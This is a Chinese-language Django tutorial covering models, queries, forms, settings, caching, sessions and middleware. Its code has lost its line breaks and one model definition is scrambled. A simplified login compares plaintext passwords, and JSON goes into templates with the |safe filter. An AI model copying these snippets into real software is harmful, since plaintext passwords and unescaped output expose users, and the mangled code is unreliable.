所在的那个文件夹下输入这个命令 注意：Django 1.7 及以上的版本需要用以下命令python manage.py makemigrationspython manage.py migrate$ python manage.py shell &gt;&gt;&gt; from people.models import Person&gt;&gt;&gt; Person.objects.create(name="WeizhongTu", age=24)&lt;Person: Person object&gt;&gt;&gt;&gt;from django.db import models class Person(models.Model): name = models.CharField(max_length=30) age = models.IntegerField() def __unicode__(self): # 在Python3中使用 def __str__(self) return self.name 新建一个对象的方法有以下几种：1.Person.objects.create(name=name,age=age)2.p = Person(name=”WZ”, age=23) p.save()3.p = Person(name=”TWZ”) p.age = 23 p.save()4.Person.objects.get_or_create(name=”WZT”, age=23)这种方法是防止重复很好的方法，但是速度要相对慢些，返回一个元组，第一个为Person对象，第二个为True或False, 新建时返回的是True, 已经存在时返回False. 获取对象有以下方法：1.Person.objects.all()2.Person.objects.all()[:10] 切片操作，获取10个人，不支持负索引，切片可以节约内存3.Person.objects.get(name=name)1.get是用来获取一个对象的，如果需要获取满足条件的一些人，就要用到filter2.Person.objects.filter(name=”abc”) # 等于 Person.objects.filter(name__exact=”abc”) 名称严格等于 “abc” 的人3.Person.objects.filter(name__iexact=”abc”) # 名称为 abc 但是不区分大小写，可以找到 ABC, Abc, aBC，这些都符合条件 4.Person.objects.filter(name__contains=”abc”) # 名称中包含 “abc”的人5.Person.objects.filter(name__icontains=”abc”) #名称中包含 “abc”，且abc不区分大小写 6.Person.objects.filter(name__regex=”^abc”) # 正则表达式查询7.Person.objects.filter(name__iregex=”^abc”)# 正则表达式不区分大小写 filter是找出满足条件的，当然也有排除符合某条件的8.Person.objects.exclude(name__contains=”WZ”) # 排除包含 WZ 的Person对象9.Person.objects.filter(name__contains=”abc”).exclude(age=23) # 找出名称含有abc, 但是排除年龄是23岁的 自定义Field1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#coding:utf-8from django.db import models class CompressedTextField(models.TextField): """ model Fields for storing text in a compressed format (bz2 by default) """ def from_db_value(self, value, expression, connection, context): if not value: return value try: return value.decode('base64').decode('bz2').decode('utf-8') except Exception: return value def to_python(self, value): if not value: return value try: return value.decode('base64').decode('bz2').decode('utf-8') except Exception: return value def get_prep_value(self, value): if not value: return value try: value.decode('base64') return value except Exception: try: return value.encode('utf-8').encode('bz2').encode('base64') except Exception: return value做一个列表保存到数据库from django.db import modelsimport ast class ListField(models.TextField): __metaclass__ = models.SubfieldBase description = "Stores a python list" def __init__(self, *args, **kwargs): super(ListField, self).__init__(*args, **kwargs) def to_python(self, value): if not value: value = [] if isinstance(value, list): return value return ast.literal_eval(value) def get_prep_value(self, value): if value is None: return value return unicode(value) # use str(value) in Python 3 def value_to_string(self, obj): value = self._get_val_from_obj(obj) return self.get_db_prep_value(value) 数据表修改South工具(1)QuerySet创建对象的方法(2)获取对象的方法(3)QuerySet是可迭代的(4)QuerySet是可以用pickle序列化到硬盘再读取出来(5)QuerySet查询结果排序(6)QuerySet支持链式查询(7)QuerySet不支持负索引(8)QuerySet重复的问题，使用.distinct()去重 django后台123456789101112# coding:utf-8from django.db import models class Article(models.Model): title = models.CharField(u'标题', max_length=256) content = models.TextField(u'内容') pub_date = models.DateTimeField(u'发表时间', auto_now_add=True, editable = True) update_time = models.DateTimeField(u'更新时间',auto_now=True, null def __unicode__(self):# 在Python3中用 __str__ 代替 __unicode__ return self.title=True) django表单GET请求：前台：12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;p&gt;请输入两个数字&lt;/p&gt; &lt;form action="/add/" method="get"&gt; a: &lt;input type="text" name="a"&gt; &lt;br&gt; b: &lt;input type="text" name="b"&gt; &lt;br&gt; &lt;input type="submit" value="提交"&gt;&lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 后台：123456789101112from django.http import HttpResponsefrom django.shortcuts import render def index(request): return render(request, 'index.html') def add(request): a = request.GET['a'] b = request.GET['b'] a = int(a) b = int(b) return HttpResponse(str(a+b)) POST请求:forms.py12345from django import forms class AddForm(forms.Form): a = forms.IntegerField() b = forms.IntegerField() views.py1234567891011121314151617181920# coding:utf-8from django.shortcuts import renderfrom django.http import HttpResponse # 引入我们创建的表单类from .forms import AddForm def index(request): if request.method == 'POST':# 当提交表单时 form = AddForm(request.POST) # form 包含提交的数据 if form.is_valid():# 如果提交的数据合法 a = form.cleaned_data['a'] b = form.cleaned_data['b'] return HttpResponse(str(int(a) + int(b))) else:# 当正常访问时 form = AddForm() return render(request, 'index.html', &#123;'form': form&#125;) index.html12345&lt;form method='post'&gt;&#123;% csrf_token %&#125;&#123;&#123; form &#125;&#125;&lt;input type="submit" value="提交"&gt;&lt;/form&gt; urls.py12345678910from django.conf.urls import patterns, include, url from django.contrib import adminadmin.autodiscover() urlpatterns = patterns('', # 注意下面这一行 url(r'^$', 'tools.views.index', name='home'), url(r'^admin/', include(admin.site.urls)),) django配置123# Build paths inside the project like this: os.path.join(BASE_DIR, ...)import osBASE_DIR = os.path.dirname(os.path.dirname(__file__)) 这里用到了python中一个神奇的变量 file 这个变量可以获取到当前文件（包含这个代码的文件）的路径。os.path.dirname(file) 得到文件所在目录，再来一个os.path.dirname()就是目录的上一级，BASE_DIR 即为 项目 所在目录。我们在后面的与目录有关的变量都用它，这样使得移植性更强。123# SECURITY WARNING: don't run with debug turned on in production!DEBUG = TrueTEMPLATE_DEBUG = True DEBUG＝True 时，如果出现 bug 便于我们看见问题所在，但是部署时最好不要让用户看见bug的详情，可能一些不怀好心的人攻击网站，造成不必要的麻烦。1ALLOWED_HOSTS = ['*.besttome.com','www.ziqiangxuetang.com'] ALLOWED_HOSTS 允许你设置哪些域名可以访问，即使在 Apache 或 Nginx 等中绑定了，这里不允许的话，也是不能访问的。当 DEBUG=False 时，这个为必填项，如果不想输入，可以用 ALLOW_HOSTS = [‘*’] 来允许所有的。12STATIC_URL = '/static/'STATIC_ROOT = os.path.join(BASE_DIR,'static') static 是静态文件所有目录，比如 jquery.js, bootstrap.min.css 等文件。一般来说我们只要把静态文件放在 APP 中的 static 目录下，部署时用 python manage.py collectstatic 就可以把静态文件收集到（复制到） STATIC_ROOT 目录，但是有时我们有一些共用的静态文件，这时候可以设置 STATICFILES_DIRS 另外弄一个文件夹，如下：1234STATICFILES_DIRS = ( os.path.join(BASE_DIR, "common_static"), '/var/www/static/',) 这样我们就可以把静态文件放在 common_static 和 /var/www/static/中了，Django也能找到它们。12MEDIA_URL = '/media/'MEDIA_ROOT = os.path.join(BASE_DIR,'media') media文件夹用来存放用户上传的文件，与权限有关，详情见 Django 静态文件 和 Django 部署123456789TEMPLATES = [ &#123; 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'DIRS': [ os.path.join(BASE_DIR,'templates').replace('\\', '/'), os.path.join(BASE_DIR,'templates2').replace('\\', '/'), ], 'APP_DIRS': True,] 这样 就可以把模板文件放在 templates 和 templates2 文件夹中了。 Django静态文件1234567891011121314151617181920212223# Static files (CSS, JavaScript, Images)# https://docs.djangoproject.com/en/1.8/howto/static-files/ STATIC_URL = '/static/' # 当运行 python manage.py collectstatic 的时候# STATIC_ROOT 文件夹 是用来将所有STATICFILES_DIRS中所有文件夹中的文件，以及各app中static中的文件都复制过来# 把这些文件放到一起是为了用apache等部署的时候更方便STATIC_ROOT = os.path.join(BASE_DIR, 'collected_static') # 其它 存放静态文件的文件夹，可以用来存放项目中公用的静态文件，里面不能包含 STATIC_ROOT# 如果不想用 STATICFILES_DIRS 可以不用，都放在 app 里的 static 中也可以STATICFILES_DIRS = ( os.path.join(BASE_DIR, "common_static"), '/path/to/others/static/', # 用不到的时候可以不写这一行) # 这个是默认设置，Django 默认会在 STATICFILES_DIRS中的文件夹 和 各app下的static文件夹中找文件# 注意有先后顺序，找到了就不再继续找了STATICFILES_FINDERS ＝ ( "django.contrib.staticfiles.finders.FileSystemFinder", "django.contrib.staticfiles.finders.AppDirectoriesFinder") 自己分配静态文件1234567# static filesimport osfrom django.conf.urls.static import staticfrom django.conf import settingsif settings.DEBUG: media_root = os.path.join(settings.BASE_DIR,'media2') urlpatterns += static('/media2/', document_root=media_root) 123456from django.conf.urls.static import static urlpatterns = patterns('', url(r'^$', 'app.views.index', name='index'), url(r'^admin/', include(admin.site.urls)),) + static('/media2/', document_root=media_root) django部署apache部署和nginx部署 文本数据导入1234567891011121314151617181920212223242526272829#!/usr/bin/env python#coding:utf-8 import osos.environ.setdefault("DJANGO_SETTINGS_MODULE", "mysite.settings") '''Django 版本大于等于1.7的时候，需要加上下面两句import djangodjango.setup()否则会抛出错误 django.core.exceptions.AppRegistryNotReady: Models aren't loaded yet.''' import djangoif django.VERSION &gt;= (1, 7):#自动判断版本 django.setup() def main(): from blog.models import Blog f = open('oldblog.txt') for line in f: title,content = line.split('****') Blog.objects.create(title=title,content=content) f.close() if __name__ == "__main__": main() print('Done!') json文本数据导入python manage.py dumpdata fixture.json导出python manage.py loaddata fixture.json导入1234567891011121314151617181920212223#!/usr/bin/env pythonimport osos.environ.setdefault("DJANGO_SETTINGS_MODULE", "mysite.settings") def main(): from blog.models import Blog f = open('oldblog.txt') BlogList = [] for line in f: parts = line.split('****') BlogList.append(Blog(title=parts[0], content=parts[1])) f.close() # 以上四行 也可以用 列表解析 写成下面这样 # BlogList = [Blog(title=line.split('****')[0], content=line.split('****')[1]) for line in f] Blog.objects.bulk_create(BlogList) if __name__ == "__main__": main() print('Done!') django数据迁移python manage.py dumpdata [appname] &gt; appname_data.json数据库导出python manage.py loaddata blog_dump.json数据导入mysql1234567# 导出数据库 zqxt 到 zqxt.sql 文件中mysqldump -u username -p --database zqxt &gt; zqxt.sql # 导入数据库到 新的服务器mysql -u username -p输入密码进入 MySQL 命令行&gt; source /path/to/zqxt.sql django多数据库联用(1)每个app都可以单独设置一个数据库settings.py1234567891011121314151617181920212223242526272829303132# Database# https://docs.djangoproject.com/en/1.8/ref/settings/#databasesDATABASES = &#123; 'default': &#123; 'ENGINE': 'django.db.backends.sqlite3', 'NAME': os.path.join(BASE_DIR, 'db.sqlite3'), &#125;, 'db1': &#123; 'ENGINE': 'django.db.backends.postgresql_psycopg2', 'NAME': 'dbname1', 'USER': 'your_db_user_name', 'PASSWORD': 'yourpassword', "HOST": "localhost", &#125;, 'db2': &#123; 'ENGINE': 'django.db.backends.postgresql_psycopg2', 'NAME': 'dbname2', 'USER': 'your_db_user_name', 'PASSWORD': 'yourpassword', "HOST": "localhost", &#125;,&#125; # use multi-database in django# add by WeizhongTuDATABASE_ROUTERS = ['project_name.database_router.DatabaseAppsRouter']DATABASE_APPS_MAPPING = &#123; # example: #'app_name':'database_name', 'app1': 'db1', 'app2': 'db2',&#125; 在project_name文件夹中存放database_route.py1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# -*- coding: utf-8 -*-from django.conf import settings DATABASE_MAPPING = settings.DATABASE_APPS_MAPPING class DatabaseAppsRouter(object): """ A router to control all database operations on models for different databases. In case an app is not set in settings.DATABASE_APPS_MAPPING, the router will fallback to the `default` database. Settings example: DATABASE_APPS_MAPPING = &#123;'app1': 'db1', 'app2': 'db2'&#125; """ def db_for_read(self, model, **hints): """"Point all read operations to the specific database.""" if model._meta.app_label in DATABASE_MAPPING: return DATABASE_MAPPING[model._meta.app_label] return None def db_for_write(self, model, **hints): """Point all write operations to the specific database.""" if model._meta.app_label in DATABASE_MAPPING: return DATABASE_MAPPING[model._meta.app_label] return None def allow_relation(self, obj1, obj2, **hints): """Allow any relation between apps that use the same database.""" db_obj1 = DATABASE_MAPPING.get(obj1._meta.app_label) db_obj2 = DATABASE_MAPPING.get(obj2._meta.app_label) if db_obj1 and db_obj2: if db_obj1 == db_obj2: return True else: return False return None def allow_syncdb(self, db, model): """Make sure that apps only appear in the related database.""" if db in DATABASE_MAPPING.values(): return DATABASE_MAPPING.get(model._meta.app_label) == db elif model._meta.app_label in DATABASE_MAPPING: return False return None 2、使用指定的数据库来进行操作1234567# 查询YourModel.objects.using('db1').all() 或者 YourModel.objects.using('db2').all() # 保存 或 删除user_obj.save(using='new_users')user_obj.delete(using='legacy_users') 3、多个数据库联用时数据导入导出数据库同步1234567891011python manage.py syncdb #同步默认的数据库，和原来的没有区别 #同步数据库 db1 (注意：不是数据库名是db1,是settings.py中的那个db1，不过你可以使这两个名称相同，容易使用)python manage.py syncdb --database=db1数据导出python manage.py dumpdata app1 --database=db1 &gt; app1_fixture.jsonpython manage.py dumpdata app2 --database=db2 &gt; app2_fixture.jsonpython manage.py dumpdata auth &gt; auth_fixture.json数据导入python manage.py loaddata app1_fixture.json --database=db1python manage.py loaddata app2_fixture.json --database=db2 django缓存cachesettings.py12345&#123; 'default': &#123; 'BACKEND': 'django.core.cache.backends.locmem.LocMemCache', &#125;&#125; 利用文件系统来缓存12345678910CACHES = &#123; 'default': &#123; 'BACKEND': 'django.core.cache.backends.filebased.FileBasedCache', 'LOCATION': '/var/tmp/django_cache', 'TIMEOUT': 600, 'OPTIONS': &#123; 'MAX_ENTRIES': 1000 &#125; &#125;&#125; 利用数据库来缓存12345678910CACHES = &#123; 'default': &#123; 'BACKEND': 'django.core.cache.backends.db.DatabaseCache', 'LOCATION': 'cache_table_name', 'TIMEOUT': 600, 'OPTIONS': &#123; 'MAX_ENTRIES': 2000 &#125; &#125;&#125; django缓存系统实例12345from django.shortcuts import renderdef index(request): # 读取数据库等 并渲染到网页 # 数据库获取的结果保存到 queryset 中 return render(request, 'index.html', &#123;'queryset':queryset&#125;) 像这样每次访问都要读取数据库，一般的小网站没什么问题，当访问量非常大的时候，就会有很多次的数据库查询，肯定会造成访问速度变慢，服务器资源占用较多等问题。1234567from django.shortcuts import renderfrom django.views.decorators.cache import cache_page @cache_page(60 * 15) # 秒数，这里指缓存 15 分钟，不直接写900是为了提高可读性def index(request): # 读取数据库等 并渲染到网页 return render(request, 'index.html', &#123;'queryset':queryset&#125;) django生成静态网页views.py12345678910111213141516from django.shortcuts import renderfrom django.template.loader import render_to_stringimport os def my_view(request): context = &#123;'some_key': 'some_value'&#125; static_html = '/path/to/static.html' if not os.path.exists(static_html): content = render_to_string('template.html', context) with open(static_html, 'w') as static_file: static_file.write(content) return render(request, static_html) 上面的例子中，当用户访问时，如果判断没有静态页面就自动生成静态页面，然后返回静态文件，当文件存在的时候就不再次生成。也可以用一个文件夹，比如在project下建一个 static_html 文件夹，把生成的静态文件都放里面，让用户像访问静态文件那样访问页面。 django国际化(1)开启国际化支持settings.py123456789101112131415161718192021222324252627282930313233MIDDLEWARE_CLASSES = ( ... 'django.middleware.locale.LocaleMiddleware',) LANGUAGE_CODE = 'en'TIME_ZONE = 'UTC'USE_I18N = TrueUSE_L10N = TrueUSE_TZ = True LANGUAGES = ( ('en', ('English')), ('zh-cn', ('中文简体')), ('zh-tw', ('中文繁體')),)1.9版本以上LANGUAGES = ( ('en', ('English')), ('zh-hans', ('中文简体')), ('zh-hant', ('中文繁體')),) #翻译文件所在目录，需要手工创建LOCALE_PATHS = ( os.path.join(BASE_DIR, 'locale'),) TEMPLATE_CONTEXT_PROCESSORS = ( ... "django.core.context_processors.i18n",) (2)生成需要的编译的文件12python manage.py makemessages -l zh-cnpython manage.py makemessages -l zh-tw (3)编译1python manage.py compilemessages django sessionsettings.py配置1'django.contrib.sessions.middleware.SessionMiddleware', 在视图中使用session123456# 创建或修改 session：request.session[key] = value# 获取 session：request.session.get(key,default=None)# 删除 sessiondel request.session[key] # 不存在时报错 session例子：不让用户评论两次123456789from django.http import HttpResponse def post_comment(request, new_comment): if request.session.get('has_commented', False): return HttpResponse("You've already commented.") c = comments.Comment(comment=new_comment) c.save() request.session['has_commented'] = True return HttpResponse('Thanks for your comment!') 一个简化的登录认证：123456789101112131415def login(request): m = Member.objects.get(username=request.POST['username']) if m.password == request.POST['password']: request.session['member_id'] = m.id return HttpResponse("You're logged in.") else: return HttpResponse("Your username and password didn't match.") def logout(request): try: del request.session['member_id'] except KeyError: pass return HttpResponse("You're logged out.") django传递数据给js一、页面加载完成后(ajax)二、直接在视图函数(一次性渲染，同一次请求)views.py123456from __future__ import unicode_literalsfrom django.shortcuts import render def home(request): List = ['自强学堂', '渲染Json到模板'] return render(request, 'home.html', &#123;'List': List&#125;) home.html1234&lt;script type="text/javascript"&gt; var List = &#123;&#123; List &#125;&#125;; alert(List);&lt;/script&gt; 会报错需要注意两点： views.py中返回的函数中的值要用 json.dumps()处理 在网页上要加一个 safe 过滤器。views.py1234567891011121314# -*- coding: utf-8 -*- from __future__ import unicode_literals import jsonfrom django.shortcuts import render def home(request): List = ['自强学堂', '渲染Json到模板'] Dict = &#123;'site': '自强学堂', 'author': '涂伟忠'&#125; return render(request, 'home.html', &#123; 'List': json.dumps(List), 'Dict': json.dumps(Dict) &#125;) home.html 只给出了js的核心部分1234//列表var List = &#123;&#123; List|safe &#125;&#125;;//字典var Dict = &#123;&#123; Dict|safe &#125;&#125;; django中间件1、比如我们要做一个拦截器，发现有恶意访问网站的人，就拦截他。123456#项目 zqxt 文件名 zqxt/middleware.py class BlockedIpMiddleware(object): def process_request(self, request): if request.META['REMOTE_ADDR'] in getattr(settings, "BLOCKED_IPS", []): return http.HttpResponseForbidden('&lt;h1&gt;Forbidden&lt;/h1&gt;') 这里的代码的功能就是 获取当前访问者的 IP (request.META[‘REMOTE_ADDR’])，如果这个 IP 在黑名单中就拦截，如果不在就返回 None (函数中没有返回值其实就是默认为 None)，把这个中间件的 Python 路径写到settings.py中1234MIDDLEWARE_CLASSES = ( 'zqxt.middleware.BlockedIpMiddleware', ...其它的中间件) Django 会从 MIDDLEWARE_CLASSES 中按照从上到下的顺序一个个执行中间件中的 process_request 函数，而其中 process_response 函数则是最前面的最后执行。2.再比如，我们在网站放到服务器上正式运行后，DEBUG改为了 False，这样更安全，但是有时候发生错误我们不能看到错误详情，调试不方便，有没有办法处理好这两个事情呢？(1)普通访问者看到的是友好的报错信息。(2)管理员看到的是错误详情，以便于修复BUG12345678import sysfrom django.views.debug import technical_500_responsefrom django.conf import settings class UserBasedExceptionMiddleware(object): def process_exception(self, request, exception): if request.user.is_superuser or request.META.get('REMOTE_ADDR') in settings.INTERNAL_IPS: return technical_500_response(request, *sys.exc_info()) 3、识别手机的中间件1234567891011121314151617181920212223242526272829303132333435MOBILE_USERAGENTS = ("2.0 MMP","240x320","400X240","AvantGo","BlackBerry", "Blazer","Cellphone","Danger","DoCoMo","Elaine/3.0","EudoraWeb", "Googlebot-Mobile","hiptop","IEMobile","KYOCERA/WX310K","LG/U990", "MIDP-2.","MMEF20","MOT-V","NetFront","Newt","Nintendo Wii","Nitro", "Nokia","Opera Mini","Palm","PlayStation Portable","portalmmm","Proxinet", "ProxiNet","SHARP-TQ-GX10","SHG-i900","Small","SonyEricsson","Symbian OS", "SymbianOS","TS21i-10","UP.Browser","UP.Link","webOS","Windows CE", "WinWAP","YahooSeeker/M1A1-R2D2","iPhone","iPod","Android", "BlackBerry9530","LG-TU915 Obigo","LGE VX","webOS","Nokia5800") class MobileTemplate(object): """ If a mobile user agent is detected, inspect the default args for the view func, and if a template name is found assume it is the template arg and attempt to load a mobile template based on the original template name. """ def process_view(self, request, view_func, view_args, view_kwargs): if any(ua for ua in MOBILE_USERAGENTS if ua in request.META["HTTP_USER_AGENT"]): template = view_kwargs.get("template") if template is None: for default in view_func.func_defaults: if str(default).endswith(".html"): template = default if template is not None: template = template.rsplit(".html", 1)[0] + ".mobile.html" try: get_template(template) except TemplateDoesNotExist: pass else: view_kwargs["template"] = template return view_func(request, *view_args, **view_kwargs) return None]]></content>
      <categories>
        <category>python</category>
        <category>django</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
</search>
